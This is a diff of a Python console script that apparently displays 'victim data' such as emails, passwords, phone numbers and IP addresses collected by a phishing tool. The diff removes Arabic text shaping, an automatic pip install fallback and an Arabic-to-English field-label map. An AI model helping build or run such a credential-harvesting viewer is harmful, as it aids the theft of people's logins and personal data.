@@ -6,28 +6,12 @@ import uuid
 import threading
 import time
 import sys
-import subprocess
 
 if hasattr(sys.stdout, 'reconfigure'):
     sys.stdout.reconfigure(encoding='utf-8')
     sys.stderr.reconfigure(encoding='utf-8')
 if hasattr(sys.stdin, 'reconfigure'):
     sys.stdin.reconfigure(encoding='utf-8')
-
-try:
-    import arabic_reshaper
-    from bidi.algorithm import get_display
-    ARABIC_SHAPING = True
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "arabic-reshaper", "python-bidi"])
-    import arabic_reshaper
-    from bidi.algorithm import get_display
-    ARABIC_SHAPING = True
-
-def ar(text):
-    if not ARABIC_SHAPING:
-        return text
-    return get_display(arabic_reshaper.reshape(text))
 
 ORANGE = "\033[38;5;208m"
 RED = '\033[91m'
@@ -86,32 +70,6 @@ LINKS = {
 }
 
 COL_WIDTH = 26
-
-ARABIC_TO_ENGLISH = {
-    "البريد الإلكتروني": "Email",
-    "البريد الالكتروني": "Email",
-    "البريد": "Email",
-    "كلمة السر": "Password",
-    "كلمة المرور": "Password",
-    "اسم المستخدم": "Username",
-    "رقم الهاتف": "Phone Number",
-    "الهاتف": "Phone",
-    "الاسم": "Name",
-    "المدينة": "City",
-    "الدولة": "Country",
-    "IP": "IP",
-    "عنوان IP": "IP Address",
-    "User-Agent": "User-Agent",
-    "الوقت": "Time",
-    "بيانات": "Data",
-    "جديدة": "New",
-    "غير معروف": "Unknown"
-}
-
-def translate_arabic_to_english(text):
-    for arabic, english in ARABIC_TO_ENGLISH.items():
-        text = text.replace(arabic, english)
-    return text
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -173,7 +131,6 @@ def display_victim_data(message):
         line = line.strip()
         if not line:
             continue
-        line = translate_arabic_to_english(line)
         if ':' in line:
             key, val = line.split(':', 1)
             print(WHITE + BOLD + key.strip() + RESET + ": " + WHITE + val.strip() + RESET)
